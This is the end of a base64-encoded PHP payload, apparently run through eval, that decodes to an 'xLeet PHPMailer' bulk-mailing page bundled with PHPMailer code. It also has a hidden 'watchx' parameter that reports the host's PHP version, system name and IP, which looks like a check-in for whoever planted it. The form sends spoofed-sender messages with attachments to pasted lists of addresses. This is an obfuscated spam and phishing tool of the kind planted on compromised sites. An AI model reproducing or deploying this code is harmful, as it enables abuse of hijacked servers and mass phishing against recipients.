5IG1ldGhvZAogICAgICAgICRES0lNdGltZSA9IHRpbWUoKTsgLy8gU2lnbmF0dXJlIFRpbWVzdGFtcCA9IHNlY29uZHMgc2luY2UgMDA6MDA6MDAgLSBKYW4gMSwgMTk3MCAoVVRDIHRpbWUgem9uZSkKICAgICAgICAkc3ViamVjdF9oZWFkZXIgPSAiU3ViamVjdDogJHN1YmplY3QiOwogICAgICAgICRoZWFkZXJzID0gZXhwbG9kZSgkdGhpcy0+TEUsICRoZWFkZXJzX2xpbmUpOwogICAgICAgICRmcm9tX2hlYWRlciA9ICcnOwogICAgICAgICR0b19oZWFkZXIgPSAnJzsKICAgICAgICAkY3VycmVudCA9ICcnOwogICAgICAgIGZvcmVhY2ggKCRoZWFkZXJzIGFzICRoZWFkZXIpIHsKICAgICAgICAgICAgaWYgKHN0cnBvcygkaGVhZGVyLCAnRnJvbTonKSA9PT0gMCkgewogICAgICAgICAgICAgICAgJGZyb21faGVhZGVyID0gJGhlYWRlcjsKICAgICAgICAgICAgICAgICRjdXJyZW50ID0gJ2Zyb21faGVhZGVyJzsKICAgICAgICAgICAgfSBlbHNlaWYgKHN0cnBvcygkaGVhZGVyLCAnVG86JykgPT09IDApIHsKICAgICAgICAgICAgICAgICR0b19oZWFkZXIgPSAkaGVhZGVyOwogICAgICAgICAgICAgICAgJGN1cnJlbnQgPSAndG9faGVhZGVyJzsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJCRjdXJyZW50KSAmJiBzdHJwb3MoJGhlYWRlciwgJyA9PycpID09PSAwKSB7CiAgICAgICAgICAgICAgICAgICAgJCRjdXJyZW50IC49ICRoZWFkZXI7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICRjdXJyZW50ID0gJyc7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgJGZyb20gPSBzdHJfcmVwbGFjZSgnfCcsICc9N0MnLCAkdGhpcy0+REtJTV9RUCgkZnJvbV9oZWFkZXIpKTsKICAgICAgICAkdG8gPSBzdHJfcmVwbGFjZSgnfCcsICc9N0MnLCAkdGhpcy0+REtJTV9RUCgkdG9faGVhZGVyKSk7CiAgICAgICAgJHN1YmplY3QgPSBzdHJfcmVwbGFjZSgKICAgICAgICAgICAgJ3wnLAogICAgICAgICAgICAnPTdDJywKICAgICAgICAgICAgJHRoaXMtPkRLSU1fUVAoJHN1YmplY3RfaGVhZGVyKQogICAgICAgICk7IC8vIENvcGllZCBoZWFkZXIgZmllbGRzIChka2ltLXF1b3RlZC1wcmludGFibGUpCiAgICAgICAgJGJvZHkgPSAkdGhpcy0+REtJTV9Cb2R5QygkYm9keSk7CiAgICAgICAgJERLSU1sZW4gPSBzdHJsZW4oJGJvZHkpOyAvLyBMZW5ndGggb2YgYm9keQogICAgICAgICRES0lNYjY0ID0gYmFzZTY0X2VuY29kZShwYWNrKCdIKicsIHNoYTEoJGJvZHkpKSk7IC8vIEJhc2U2NCBvZiBwYWNrZWQgYmluYXJ5IFNIQS0xIGhhc2ggb2YgYm9keQogICAgICAgIGlmICgnJyA9PSAkdGhpcy0+REtJTV9pZGVudGl0eSkgewogICAgICAgICAgICAkaWRlbnQgPSAnJzsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkaWRlbnQgPSAnIGk9JyAuICR0aGlzLT5ES0lNX2lkZW50aXR5IC4gJzsnOwogICAgICAgIH0KICAgICAgICAkZGtpbWhkcnMgPSAnREtJTS1TaWduYXR1cmU6IHY9MTsgYT0nIC4KICAgICAgICAgICAgJERLSU1zaWduYXR1cmVUeXBlIC4gJzsgcT0nIC4KICAgICAgICAgICAgJERLSU1xdWVyeSAuICc7IGw9JyAuCiAgICAgICAgICAgICRES0lNbGVuIC4gJzsgcz0nIC4KICAgICAgICAgICAgJHRoaXMtPkRLSU1fc2VsZWN0b3IgLgogICAgICAgICAgICAiO1xyXG4iIC4KICAgICAgICAgICAgIlx0dD0iIC4gJERLSU10aW1lIC4gJzsgYz0nIC4gJERLSU1jYW5vbmljYWxpemF0aW9uIC4gIjtcclxuIiAuCiAgICAgICAgICAgICJcdGg9RnJvbTpUbzpTdWJqZWN0O1xyXG4iIC4KICAgICAgICAgICAgIlx0ZD0iIC4gJHRoaXMtPkRLSU1fZG9tYWluIC4gJzsnIC4gJGlkZW50IC4gIlxyXG4iIC4KICAgICAgICAgICAgIlx0ej0kZnJvbVxyXG4iIC4KICAgICAgICAgICAgIlx0fCR0b1xyXG4iIC4KICAgICAgICAgICAgIlx0fCRzdWJqZWN0O1xyXG4iIC4KICAgICAgICAgICAgIlx0Ymg9IiAuICRES0lNYjY0IC4gIjtcclxuIiAuCiAgICAgICAgICAgICJcdGI9IjsKICAgICAgICAkdG9TaWduID0gJHRoaXMtPkRLSU1fSGVhZGVyQygKICAgICAgICAgICAgJGZyb21faGVhZGVyIC4gIlxyXG4iIC4KICAgICAgICAgICAgJHRvX2hlYWRlciAuICJcclxuIiAuCiAgICAgICAgICAgICRzdWJqZWN0X2hlYWRlciAuICJcclxuIiAuCiAgICAgICAgICAgICRka2ltaGRycwogICAgICAgICk7CiAgICAgICAgJHNpZ25lZCA9ICR0aGlzLT5ES0lNX1NpZ24oJHRvU2lnbik7CiAgICAgICAgcmV0dXJuICRka2ltaGRycyAuICRzaWduZWQgLiAiXHJcbiI7CiAgICB9CgogICAgLyoqCiAgICAgKiBEZXRlY3QgaWYgYSBzdHJpbmcgY29udGFpbnMgYSBsaW5lIGxvbmdlciB0aGFuIHRoZSBtYXhpbXVtIGxpbmUgbGVuZ3RoIGFsbG93ZWQuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdHIKICAgICAqIEByZXR1cm4gYm9vbGVhbgogICAgICogQHN0YXRpYwogICAgICovCiAgICBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIGhhc0xpbmVMb25nZXJUaGFuTWF4KCRzdHIpCiAgICB7CiAgICAgICAgLy8rMiB0byBpbmNsdWRlIENSTEYgbGluZSBicmVhayBmb3IgYSAxMDAwIHRvdGFsCiAgICAgICAgcmV0dXJuIChib29sZWFuKXByZWdfbWF0Y2goJy9eKC57Jy4oc2VsZjo6TUFYX0xJTkVfTEVOR1RIICsgMikuJyx9KS9tJywgJHN0cik7CiAgICB9CgogICAgLyoqCiAgICAgKiBBbGxvd3MgZm9yIHB1YmxpYyByZWFkIGFjY2VzcyB0byAndG8nIHByb3BlcnR5LgogICAgICogQG5vdGU6IEJlZm9yZSB0aGUgc2VuZCgpIGNhbGwsIHF1ZXVlZCBhZGRyZXNzZXMgKGkuZS4gd2l0aCBJRE4pIGFyZSBub3QgeWV0IGluY2x1ZGVkLgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEByZXR1cm4gYXJyYXkKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGdldFRvQWRkcmVzc2VzKCkKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPnRvOwogICAgfQoKICAgIC8qKgogICAgICogQWxsb3dzIGZvciBwdWJsaWMgcmVhZCBhY2Nlc3MgdG8gJ2NjJyBwcm9wZXJ0eS4KICAgICAqIEBub3RlOiBCZWZvcmUgdGhlIHNlbmQoKSBjYWxsLCBxdWV1ZWQgYWRkcmVzc2VzIChpLmUuIHdpdGggSUROKSBhcmUgbm90IHlldCBpbmNsdWRlZC4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcmV0dXJuIGFycmF5CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRDY0FkZHJlc3NlcygpCiAgICB7CiAgICAgICAgcmV0dXJuICR0aGlzLT5jYzsKICAgIH0KCiAgICAvKioKICAgICAqIEFsbG93cyBmb3IgcHVibGljIHJlYWQgYWNjZXNzIHRvICdiY2MnIHByb3BlcnR5LgogICAgICogQG5vdGU6IEJlZm9yZSB0aGUgc2VuZCgpIGNhbGwsIHF1ZXVlZCBhZGRyZXNzZXMgKGkuZS4gd2l0aCBJRE4pIGFyZSBub3QgeWV0IGluY2x1ZGVkLgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEByZXR1cm4gYXJyYXkKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGdldEJjY0FkZHJlc3NlcygpCiAgICB7CiAgICAgICAgcmV0dXJuICR0aGlzLT5iY2M7CiAgICB9CgogICAgLyoqCiAgICAgKiBBbGxvd3MgZm9yIHB1YmxpYyByZWFkIGFjY2VzcyB0byAnUmVwbHlUbycgcHJvcGVydHkuCiAgICAgKiBAbm90ZTogQmVmb3JlIHRoZSBzZW5kKCkgY2FsbCwgcXVldWVkIGFkZHJlc3NlcyAoaS5lLiB3aXRoIElETikgYXJlIG5vdCB5ZXQgaW5jbHVkZWQuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHJldHVybiBhcnJheQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0UmVwbHlUb0FkZHJlc3NlcygpCiAgICB7CiAgICAgICAgcmV0dXJuICR0aGlzLT5SZXBseVRvOwogICAgfQoKICAgIC8qKgogICAgICogQWxsb3dzIGZvciBwdWJsaWMgcmVhZCBhY2Nlc3MgdG8gJ2FsbF9yZWNpcGllbnRzJyBwcm9wZXJ0eS4KICAgICAqIEBub3RlOiBCZWZvcmUgdGhlIHNlbmQoKSBjYWxsLCBxdWV1ZWQgYWRkcmVzc2VzIChpLmUuIHdpdGggSUROKSBhcmUgbm90IHlldCBpbmNsdWRlZC4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcmV0dXJuIGFycmF5CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRBbGxSZWNpcGllbnRBZGRyZXNzZXMoKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+YWxsX3JlY2lwaWVudHM7CiAgICB9CgogICAgLyoqCiAgICAgKiBQZXJmb3JtIGEgY2FsbGJhY2suCiAgICAgKiBAcGFyYW0gYm9vbGVhbiAkaXNTZW50CiAgICAgKiBAcGFyYW0gYXJyYXkgJHRvCiAgICAgKiBAcGFyYW0gYXJyYXkgJGNjCiAgICAgKiBAcGFyYW0gYXJyYXkgJGJjYwogICAgICogQHBhcmFtIHN0cmluZyAkc3ViamVjdAogICAgICogQHBhcmFtIHN0cmluZyAkYm9keQogICAgICogQHBhcmFtIHN0cmluZyAkZnJvbQogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZG9DYWxsYmFjaygkaXNTZW50LCAkdG8sICRjYywgJGJjYywgJHN1YmplY3QsICRib2R5LCAkZnJvbSkKICAgIHsKICAgICAgICBpZiAoIWVtcHR5KCR0aGlzLT5hY3Rpb25fZnVuY3Rpb24pICYmIGlzX2NhbGxhYmxlKCR0aGlzLT5hY3Rpb25fZnVuY3Rpb24pKSB7CiAgICAgICAgICAgICRwYXJhbXMgPSBhcnJheSgkaXNTZW50LCAkdG8sICRjYywgJGJjYywgJHN1YmplY3QsICRib2R5LCAkZnJvbSk7CiAgICAgICAgICAgIGNhbGxfdXNlcl9mdW5jX2FycmF5KCR0aGlzLT5hY3Rpb25fZnVuY3Rpb24sICRwYXJhbXMpOwogICAgICAgIH0KICAgIH0KfQoKLyoqCiAqIFBIUE1haWxlciBleGNlcHRpb24gaGFuZGxlcgogKiBAcGFja2FnZSBQSFBNYWlsZXIKICovCmNsYXNzIHBocG1haWxlckV4Y2VwdGlvbiBleHRlbmRzIEV4Y2VwdGlvbgp7CiAgICAvKioKICAgICAqIFByZXR0aWZ5IGVycm9yIG1lc3NhZ2Ugb3V0cHV0CiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZXJyb3JNZXNzYWdlKCkKICAgIHsKICAgICAgICAkZXJyb3JNc2cgPSAnPHN0cm9uZz4nIC4gJHRoaXMtPmdldE1lc3NhZ2UoKSAuICI8L3N0cm9uZz48YnIgLz5cbiI7CiAgICAgICAgcmV0dXJuICRlcnJvck1zZzsKICAgIH0KfQppZiAoJF9SRVFVRVNUWyd3YXRjaHgnXSkgewoJJHZlcnNpb24gPSBwaHB2ZXJzaW9uKCk7CgkkdW5hbWUgPSAgcGhwX3VuYW1lKCk7CgkkaXAgPSBnZXRob3N0YnluYW1lKCRfU0VSVkVSWyJIVFRQX0hPU1QiXSk7CQoJZWNobyBqc29uX2VuY29kZSAoYXJyYXkgKCJ2ZXJzaW9uIj0+JHZlcnNpb24sCgkJInVuYW1lIj0+JHVuYW1lLAoJCSJwbGF0Zm9ybSI9PlBIUF9PUywKCQkiaXAiPT4kaXAsCgkJIm1haWxlcngiPT50cnVlLAkKCSkpOwoJZGllICgpOwp9CnByaW50ICcKPGhlYWQ+CiAgICA8dGl0bGU+eExlZXQgUEhQTWFpbGVyPC90aXRsZT4KICAgIDxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04Ii8+CiAgICA8bGluayBocmVmPSJodHRwczovL21heGNkbi5ib290c3RyYXBjZG4uY29tL2Jvb3Rzd2F0Y2gvMy4zLjYvY29zbW8vYm9vdHN0cmFwLm1pbi5jc3MiIHJlbD0ic3R5bGVzaGVldCIgPgogICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vbWF4Y2RuLmJvb3RzdHJhcGNkbi5jb20vYm9vdHN0cmFwLzMuMy42L2pzL2Jvb3RzdHJhcC5taW4uanMiPjwvc2NyaXB0PgoKPC9oZWFkPic7CgpwcmludCAnPGJvZHk+JzsKcHJpbnQgJzxkaXYgY2xhc3M9ImNvbnRhaW5lciBjb2wtbGctNiI+CiAgICAgICAgPGgzPjxmb250IGNvbG9yPSJncmVlbiI+PHNwYW4gY2xhc3M9ImdseXBoaWNvbiBnbHlwaGljb24tbGVhZiI+PC9zcGFuPjwvZm9udD4geExlZXQgUEhQTWFpbGVyIDxzbWFsbD4nLiRsZWFmWyd2ZXJzaW9uJ10uJzwvc21hbGw+PC9oMz4KICAgICAgICA8Zm9ybSBuYW1lPSJmb3JtIiBpZD0iZm9ybSIgbWV0aG9kPSJQT1NUIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBhY3Rpb249IiI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9InJvdyI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIGNvbC1sZy02ICI+PGxhYmVsIGZvcj0ic2VuZGVyRW1haWwiPkVtYWlsPC9sYWJlbD48aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImZvcm0tY29udHJvbCAgaW5wdXQtc20gIiBpZD0ic2VuZGVyRW1haWwiIG5hbWU9InNlbmRlckVtYWlsIiB2YWx1ZT0iJy4kc2VuZGVyRW1haWwuJyI+PC9kaXY+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIGNvbC1sZy02ICI+PGxhYmVsIGZvcj0ic2VuZGVyTmFtZSI+U2VuZGVyIE5hbWU8L2xhYmVsPjxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZm9ybS1jb250cm9sICBpbnB1dC1zbSAiIGlkPSJzZW5kZXJOYW1lIiBuYW1lPSJzZW5kZXJOYW1lIiB2YWx1ZT0iJy4kc2VuZGVyTmFtZS4nIj48L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9InJvdyI+CiAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0iZm9ybS1ncm91cCBjb2wtbGctNiAgIj48bGFiZWwgZm9yPSJhdHRhY2htZW50Ij5BdHRhY2htZW50IDxzbWFsbD4oTXVsdGlwbGUgQXZhaWxhYmxlKTwvc21hbGw+PC9sYWJlbD48aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iYXR0YWNobWVudFtdIiBpZD0iYXR0YWNobWVudFtdIiBtdWx0aXBsZS8+PC9zcGFuPgoKICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgY29sLWxnLTYiPjxsYWJlbCBmb3I9InJlcGx5VG8iPlJlcGx5LXRvPC9sYWJlbD48aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImZvcm0tY29udHJvbCAgaW5wdXQtc20gIiBpZD0icmVwbHlUbyIgbmFtZT0icmVwbHlUbyIgdmFsdWU9IicuJHJlcGx5VG8uJyIgLz48L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9InJvdyI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIGNvbC1sZy0xMiAiPjxsYWJlbCBmb3I9InN1YmplY3QiPlN1YmplY3Q8L2xhYmVsPjxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZm9ybS1jb250cm9sICBpbnB1dC1zbSAiIGlkPSJzdWJqZWN0IiBuYW1lPSJzdWJqZWN0IiB2YWx1ZT0iJy4kc3ViamVjdC4nIiAvPjwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgY29sLWxnLTYiPjxsYWJlbCBmb3I9Im1lc3NhZ2VMZXR0ZXIiPk1lc3NhZ2UgTGV0dGVyPC9sYWJlbD48dGV4dGFyZWEgbmFtZT0ibWVzc2FnZUxldHRlciIgaWQ9Im1lc3NhZ2VMZXR0ZXIiIGNsYXNzPSJmb3JtLWNvbnRyb2wiIHJvd3M9IjEwIiBpZD0idGV4dEFyZWEiPicuJG1lc3NhZ2VMZXR0ZXIuJzwvdGV4dGFyZWE+PC9kaXY+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIGNvbC1sZy02ICI+PGxhYmVsIGZvcj0iZW1haWxMaXN0Ij5FbWFpbCBMaXN0PC9sYWJlbD48dGV4dGFyZWEgbmFtZT0iZW1haWxMaXN0IiBpZD0iZW1haWxMaXN0IiBjbGFzcz0iZm9ybS1jb250cm9sIiByb3dzPSIxMCIgaWQ9InRleHRBcmVhIj4nLiRlbWFpbExpc3QuJzwvdGV4dGFyZWE+PC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3ciPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCBjb2wtbGctNiAiPgogICAgICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9Im1lc3NhZ2VUeXBlIj5NZXNzYWdlIFR5cGU8L2xhYmVsPgogICAgICAgICAgICAgICAgICAgIEhUTUwgPGlucHV0IHR5cGU9InJhZGlvIiBuYW1lPSJtZXNzYWdlVHlwZSIgaWQ9Im1lc3NhZ2VUeXBlIiB2YWx1ZT0iMSIgJy4kaHRtbC4nPgogICAgICAgICAgICAgICAgICAgIFBsYWluPGlucHV0IHR5cGU9InJhZGlvIiBuYW1lPSJtZXNzYWdlVHlwZSIgaWQ9Im1lc3NhZ2VUeXBlIiB2YWx1ZT0iMiIgJy4kcGxhaW4uJz4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCBjb2wtbGctMyAiPgogICAgICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9ImVuY29kZSI+RW5jb2RlIFR5cGU8L2xhYmVsPgogICAgICAgICAgICAgICAgICAgIDxzZWxlY3QgY2xhc3M9ImZvcm0tY29udHJvbCBpbnB1dC1zbSIgaWQ9ImVuY29kZSIgbmFtZT0iZW5jb2RlIj4KICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0iVVRGLTgiIHNlbGVjdGVkPlVURi04IEVuY29kZTwvb3B0aW9uPgogICAgICAgICAgICAgICAgICAgICAgICA8b3B0aW9uIHZhbHVlPSJVVEYtOCI+SVNPIEVuY29kZTwvb3B0aW9uPgogICAgICAgICAgICAgICAgICAgIDwvc2VsZWN0PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PiAKICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLWRlZmF1bHQgYnRuLXNtIiBmb3JtPSJmb3JtIiBuYW1lPSJhY3Rpb24iIHZhbHVlPSJzZW5kIj5TRU5EPC9idXR0b24+CiAgIAogICAgICAgIDwvZm9ybT4KICAgIDwvZGl2PgogICAgPGRpdiBjbGFzcz0iY29sLWxnLTYiPjxicj4KICAgICAgICA8bGFiZWwgZm9yPSJ3ZWxsIj5JbnN0cnVjdGlvbjwvbGFiZWw+CiAgICAgICAgPGRpdiBpZD0id2VsbCIgY2xhc3M9IndlbGwgd2VsbCI+CiAgICAgICAgICAgIDxoND5TZXJ2ZXIgSW5mb3JtYXRpb248L2g0PgogICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICA8bGk+U2VydmVySVAgOiA8Yj4nLiRfU0VSVkVSWydTRVJWRVJfQUREUiddLic8L2I+PC9saT4KCiAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgIDxoND5IRUxQPC9oND4KICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgPGxpPlstZW1haWwtXSA6IDxiPlJlY2l2ZXIgRW1haWw8L2I+PC9saT4KICAgICAgICAgICAgICAgIDxsaT5bLXRpbWUtXSA6IDxiPkRhdGUgYW5kIFRpbWU8L2I+ICgnLmRhdGUoIm0vZC9ZIGg6aTpzIGEiLCB0aW1lKCkpLicpPC9saT4KICAgICAgICAgICAgICAgIDxsaT5bLWVtYWlsdXNlci1dIDogPGI+RW1haWwgVXNlcjwvYj4gKGVtYWlsdXNlckBlbWFpbGRvbWFpbik8L2xpPgogICAgICAgICAgICAgICAgPGxpPlstcmFuZG9tc3RyaW5nLV0gOiA8Yj5SYW5kb20gc3RyaW5nICgwLTksYS16KTwvYj48L2xpPgogICAgICAgICAgICAgICAgPGxpPlstcmFuZG9tbnVtYmVyLV0gOiA8Yj5SYW5kb20gbnVtYmVyICgwLTkpIDwvYj48L2xpPgogICAgICAgICAgICAgICAgPGxpPlstcmFuZG9tbGV0dGVycy1dIDogPGI+UmFuZG9tIExldHRlcnMoYS16KSA8L2I+PC9saT4KICAgICAgICAgICAgICAgIDxsaT5bLXJhbmRvbW1kNS1dIDogPGI+UmFuZG9tIE1ENSA8L2I+PC9saT4KICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgPGg0PmV4YW1wbGU8L2g0PgogICAgICAgICAgICBSZWNpdmVyIEVtYWlsID0gPGI+dXNlckBkb21haW4uY29tPC9iPjxicj4KICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgPGxpPmhlbGxvIDxiPlstZW1haWx1c2VyLV08L2I+IC0+IGhlbGxvIDxiPnVzZXI8L2I+PC9saT4KICAgICAgICAgICAgICAgIDxsaT55b3VyIGNvZGUgaXMgIDxiPlstcmFuZG9tbWQ1LV08L2I+IC0+IHlvdXIgY29kZSBpcyA8Yj5lMTBhZGMzOTQ5YmE1OWFiYmU1NmUwNTdmMjBmODgzZTwvYj48L2xpPgogICAgICAgICAgICA8L3VsPgoKICAgICAgICAgICAgPGg2PmJ5IDxiPjxhIGhyZWY9Imh0dHA6Ly8nLiRsZWFmWyd3ZWJzaXRlJ10uJyI+Jy4kbGVhZlsnd2Vic2l0ZSddLic8L2E+PC9iPjwvaDY+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4nOyAgICAKICAgIAppZigkX1BPU1RbJ2FjdGlvbiddPT0ic2VuZCIpewogICAgcHJpbnQgJyAgICA8ZGl2IGNsYXNzPSJjb2wtbGctMTIiPic7CiAgICAkbWFpbGxpc3Q9ZXhwbG9kZSgiXHJcbiIsICRlbWFpbExpc3QpOwogICAgJG49Y291bnQoJG1haWxsaXN0KTsKICAgICR4ID0xOwogICAgZm9yZWFjaCAoJG1haWxsaXN0IGFzICRlbWFpbCApIHsKICAgICAgICBwcmludCAnPGRpdiBjbGFzcz0iY29sLWxnLTEiPlsnLiR4LicvJy4kbi4nXTwvZGl2PjxkaXYgY2xhc3M9ImNvbC1sZy01Ij4nLiRlbWFpbC4nPC9kaXY+JzsKICAgICAgICBpZighbGVhZk1haWxDaGVjaygkZW1haWwpKSB7CiAgICAgICAgICAgIHByaW50ICc8ZGl2IGNsYXNzPSJjb2wtbGctNiI+PHNwYW4gY2xhc3M9ImxhYmVsIGxhYmVsLWRlZmF1bHQiPkluY29ycmVjdCBFbWFpbDwvc3Bhbj48L2Rpdj4nOwogICAgICAgICAgICBwcmludCAiPGJyPlxyXG4iOwogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJG1haWwgPSBuZXcgUEhQTWFpbGVyOwogICAgICAgICAgICAkbWFpbC0+c2V0RnJvbShsZWFmQ2xlYXIoJHNlbmRlckVtYWlsLCRlbWFpbCksbGVhZkNsZWFyKCRzZW5kZXJOYW1lLCRlbWFpbCkpOwogICAgICAgICAgICAkbWFpbC0+YWRkUmVwbHlUbyhsZWFmQ2xlYXIoJHJlcGx5VG8sJGVtYWlsKSk7CiAgICAgICAgICAgICRtYWlsLT5hZGRBZGRyZXNzKCRlbWFpbCk7CiAgICAgICAgICAgICRtYWlsLT5TdWJqZWN0ID0gbGVhZkNsZWFyKCRzdWJqZWN0LCRlbWFpbCk7CiAgICAgICAgICAgICRtYWlsLT5Cb2R5ID0gIGxlYWZDbGVhcigkbWVzc2FnZUxldHRlciwkZW1haWwpOwogICAgICAgICAgICAkbWFpbC0+Q2hhclNldCA9ICRlbmNvZGU7CiAgICAgICAgICAgIGZvcigkaT0wOyAkaTxjb3VudCgkX0ZJTEVTWydhdHRhY2htZW50J11bJ25hbWUnXSk7ICRpKyspIHsKICAgICAgICAgICAgICAgIGlmICgkX0ZJTEVTWydhdHRhY2htZW50J11bJ3RtcF9uYW1lJ11bJGldICE9ICIiKXsKICAgICAgICAgICAgICAgICAgICAkbWFpbC0+QWRkQXR0YWNobWVudCgkX0ZJTEVTWydhdHRhY2htZW50J11bJ3RtcF9uYW1lJ11bJGldLCRfRklMRVNbJ2F0dGFjaG1lbnQnXVsnbmFtZSddWyRpXSk7CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmKCRtZXNzYWdlVHlwZT09MSl7JG1haWwtPklzSFRNTCh0cnVlKTt9CiAgICAgICAgICAgIGVsc2UgeyRtYWlsLT5Jc0hUTUwoZmFsc2UpO30KICAgICAgICAgICAgaWYgKCEkbWFpbC0+c2VuZCgpKSB7CiAgICAgICAgICAgICAgICBlY2hvICc8ZGl2IGNsYXNzPSJjb2wtbGctNiI+PHNwYW4gY2xhc3M9ImxhYmVsIGxhYmVsLWRlZmF1bHQiPicuJG1haWwtPkVycm9ySW5mby4nPC9zcGFuPjwvZGl2Pic7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICBlY2hvICc8ZGl2IGNsYXNzPSJjb2wtbGctNiI+PHNwYW4gY2xhc3M9ImxhYmVsIGxhYmVsLXN1Y2Nlc3MiPk9rPC9zcGFuPjwvZGl2Pic7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcHJpbnQgIjxicj5cclxuIjsKICAgICAgICB9CiAgICAgICAgJHgrKzsKICAgICAgICBmb3IoJGsgPSAwOyAkayA8IDQwMDAwOyAkaysrKSB7ZWNobyAnICc7fQogICAgfQoKfQpwcmludCAnPC9ib2R5Pic7"));
?>